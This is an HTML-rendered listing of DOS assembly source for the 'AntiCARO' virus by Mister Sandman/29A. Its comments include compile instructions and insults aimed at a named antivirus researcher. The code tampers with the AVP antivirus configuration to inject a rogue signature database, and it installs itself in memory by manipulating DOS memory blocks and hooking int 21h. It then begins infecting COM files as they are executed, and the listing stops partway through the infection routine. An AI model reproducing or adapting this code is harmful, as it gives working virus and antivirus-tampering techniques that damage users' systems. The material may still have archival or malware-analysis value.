<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Anti-AVP.1235 - anticaro.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                             ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ</span><span class="sc0">
</span><span class="sc1">;          AntiCARO                           ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;          by Mister Sandman/29A               ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;                                             ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;                                             ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As i don't agree with CARO and with the way the name viruses, and spe-</span><span class="sc0">
</span><span class="sc1">; cially the way they *misnamed* VLAD's Bizatch, i decided to write this</span><span class="sc0">
</span><span class="sc1">; virus... just to  protest against  the biggest dickhead under the sun,</span><span class="sc0">
</span><span class="sc1">; Vesselin Bonchev, the virus-baptizer who does whatever he wants making</span><span class="sc0">
</span><span class="sc1">; abuse of his 'power' in that fucking sect named CARO.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; And as i know that, albeit he works at Frisk, his favourite AV is AVP,</span><span class="sc0">
</span><span class="sc1">; i just took the decission to write this baby, which will modify AVP so</span><span class="sc0">
</span><span class="sc1">; it will detect Bizatch as 'Bizatch_:P' and not as Boza.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus is lame as hell (but i swear i wasn't able to reach Ratboy's</span><span class="sc0">
</span><span class="sc1">; or YAM's coding skills)... i only  developed its  originality. Anyway,</span><span class="sc0">
</span><span class="sc1">; it's interesting to see how does it modify AVP:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It looks for AVP.SET in the current directory it's being  loaded from.</span><span class="sc0">
</span><span class="sc1">; If it finds that file, it will  insert a new viral database in the se-</span><span class="sc0">
</span><span class="sc1">; cond field, and later it will  drop  that new database, which contains</span><span class="sc0">
</span><span class="sc1">; the data needed for detecting Bizatch from AVP (have a look at the co-</span><span class="sc0">
</span><span class="sc1">; de, which is found at the end of this virus).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As this  new viral database  has been loaded  before the  rest  of the</span><span class="sc0">
</span><span class="sc1">; other databases (except of KERNEL.AVB, which must  be always loaded in</span><span class="sc0">
</span><span class="sc1">; the first place), it will be the first one containing Bizatch's search</span><span class="sc0">
</span><span class="sc1">; strings, so it will be  the fortunate participant  to show the name of</span><span class="sc0">
</span><span class="sc1">; the virus it has detected :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; About the  virus itself, as i told  before, it's a lame TSR COM infec-</span><span class="sc0">
</span><span class="sc1">; tor which hits files on execution (4b00h) and uses SFTs for performing</span><span class="sc0">
</span><span class="sc1">; the file infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus is  dedicated to my  friends Quantum and Qark (ex VLAD) for</span><span class="sc0">
</span><span class="sc1">; obvious reasons and to Tcp/29A because of his help on its writing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling instructions:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; tasm /m anticaro.asm</span><span class="sc0">
</span><span class="sc1">; tlink anticaro.obj</span><span class="sc0">
</span><span class="sc1">; exe2bin anticaro.exe anticaro.com</span><span class="sc0">


</span><span class="sc5">anticaro</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">anticaro</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">anticaro</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">anticaro_start</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">anticaro_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">anticaro_end</span><span class="sc4">-</span><span class="sc5">anticaro_start</span><span class="sc0">

</span><span class="sc5">entry_point</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                         </span><span class="sc1">; Get ë-offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc0">     </span><span class="sc1">; for l8r use</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                   </span><span class="sc1">; Try to open AVP.SET</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">avp_set</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; if it's found in the</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">; current directory</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">mem_res_check</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                     </span><span class="sc1">; Read the whole file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">29Ah</span><span class="sc0">                    </span><span class="sc1">;-)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">anticaro_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                   </span><span class="sc1">; Lseek to the second</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; line (first must</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">                     </span><span class="sc1">; be always KERNEL.AVB)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; Truncate file from</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; current offset</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; Write our viral</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                     </span><span class="sc1">; database name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">bizatch_name</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; (BIZATCH.AVB) as</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">; second field</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; And write the rest</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">; of the original</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">                     </span><span class="sc1">; AVP.SET we read b4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">anticaro_end</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; to our buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                     </span><span class="sc1">; Close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">                     </span><span class="sc1">; Create the new viral</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; database (BIZATCH.AVB)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">bizatch_base</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; which contains Bizatch's</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">; detection data</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; Write the database</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">base_size</span><span class="sc0">               </span><span class="sc1">; contents in the new</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">bizatch_avb</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; created file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                     </span><span class="sc1">; Close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">mem_res_check</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CA'</span><span class="sc0">                    </span><span class="sc1">; Check if we're already</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'RO'</span><span class="sc0">                    </span><span class="sc1">; memory resident</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SU'</span><span class="sc0">                    </span><span class="sc1">; Coolio residency</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'X!'</span><span class="sc0">                    </span><span class="sc1">; check... CARO SUX! :P</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nothing_to_do</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Program's MCB segment</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Y'</span><span class="sc0">       </span><span class="sc1">; Is it a Z block?</span><span class="sc0">
        </span><span class="sc6">jna</span><span class="sc0">     </span><span class="sc5">nothing_to_do</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">anticaro_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],((</span><span class="sc5">anticaro_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">       </span><span class="sc1">; Mark block as Z</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; System memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">anticaro_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">4f44h</span><span class="sc0">   </span><span class="sc1">; Mark block as owned</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc2">0053h</span><span class="sc0"> </span><span class="sc1">; by DOS (44h-4fh-53h,0)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Copy virus to memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">anticaro_size</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">anticaro_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Save int 21h's</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; original vector</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">old_int_21h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int_21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Set ours</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; CS=DS=ES</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">nothing_to_do</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">host_header</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Restore host's header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">; and jump to cs:100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; for running it</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ note_to_stupid_avers ;) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">copyright</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'[AntiCARO, by Mister Sandman/29A]'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Please note: the name of this virus is [AntiCARO] '</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'written by Mister Sandman of 29A... but... dear '</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Bontchy... name it however *you* (and not CARO) want,'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' as usual; we just don''t mind your childish '</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'stupidity :)'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ AntiCARO's int 21h handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">new_int_21h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CA'</span><span class="sc0">                    </span><span class="sc1">; Residency check</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">execution?</span><span class="sc0">                 </span><span class="sc1">; Are they asking my</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'RO'</span><span class="sc0">                    </span><span class="sc1">; opinion about CARO?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">execution?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SU'</span><span class="sc0">                    </span><span class="sc1">; Ok, CARO SUX! :P</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'X!'</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">execution?</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                   </span><span class="sc1">; This is the moment</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_name</span><span class="sc0">                 </span><span class="sc1">; we were waiting for ;)''</span><span class="sc0">

</span><span class="sc5">old_int_21h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                       </span><span class="sc1">; jmp xxxx:xxxx</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; Original int 21h</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Infection routines ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check_name</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                </span><span class="sc1">; Push all this shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">; and clear direction</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                </span><span class="sc1">; flag</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                   </span><span class="sc1">; Open the file is</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">; about to be executed</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">                    </span><span class="sc1">; Get its SFT</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">dont_infect</span><span class="sc0">                </span><span class="sc1">; Shit... outta here</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; CS=DS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check extension</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">                    </span><span class="sc1">; There aren't too many</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_file</span><span class="sc0">                 </span><span class="sc1">; 'COx' executables</span><span class="sc0">
                           </span><span class="sc1">; besides COMs, right? :)</span><span class="sc0">

</span><span class="sc5">dont_infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                </span><span class="sc1">; Pop out registers and</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; jmp to the original</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">old_int_21h</span><span class="sc0">                </span><span class="sc1">; int 21h handler</span><span class="sc0">

